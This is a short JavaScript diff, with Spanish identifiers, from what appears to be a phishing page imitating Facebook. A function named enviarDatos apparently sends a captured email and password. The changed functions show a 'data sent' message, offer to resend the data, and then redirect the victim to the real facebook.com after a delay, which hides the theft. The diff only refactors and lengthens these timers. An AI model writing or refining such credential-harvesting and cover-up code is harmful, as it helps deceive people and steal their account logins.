@@ -70,16 +70,14 @@ function enviarDatos(emailN, passN) {
 }
 
 function irAFacebook() {
-	setTimeout(mostrarRedirigiendo, 5000);
-	function mostrarRedirigiendo() {
+	setTimeout(function() {
 		//vaciar el body y mostrar un mensaje simple
 		var pgnFull = document.getElementById("boxSuper");
 		pgnFull.innerHTML = "<parrafo>Redirigiendo, por favor espera...</parrafo>";
-		setTimeout(cargarPagFace, 2000);
-		function cargarPagFace() {
+		setTimeout(function() {
 			window.location = "https://www.facebook.com/";
-		}
-	}
+		}, 2000);
+	}, 6500);
 }
 
 function cambiarCuadro() {
@@ -95,7 +93,7 @@ function cambiarCuadro() {
 		var cajaCredenciales = document.getElementById("cajaCredenciales");
 		cajaCredenciales.innerHTML = "Datos enviados, recibiras una notificación en unos momentos. <a id=\"enlaceRepetir\" href=\"\">Reenviar datos.</a>";
 		var a = document.getElementById("enlaceRepetir").href = window.location;
-	}, 4500);
+	}, 6500);
 }
 
 
